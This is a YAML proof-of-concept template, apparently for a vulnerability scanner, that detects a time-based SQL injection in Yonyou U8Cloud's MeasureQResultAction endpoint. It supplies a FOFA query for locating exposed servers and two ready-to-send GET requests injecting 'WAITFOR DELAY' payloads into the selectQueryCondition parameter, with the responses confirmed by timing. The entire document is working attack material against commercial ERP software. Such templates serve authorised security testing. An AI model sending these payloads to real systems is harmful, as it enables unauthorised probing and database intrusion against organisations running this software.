id: poc-yaml-yongyou-u8c-measureqresultaction-sqli
info:
  name: 用友U8Cloud系统接口MeasureQResultAction存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8cloud
  fofa: title=="U8C"
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    duration >= t1 &&

    duration <= t2 &&

    contains(body,"指标查询结果查看")

    '
- method: GET
  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:{{.t3}}%27--
  expression: 'status_code == 200 &&

    duration >= t3 &&

    duration <= t4 &&

    contains(body,"指标查询结果查看")

    '
transport: http
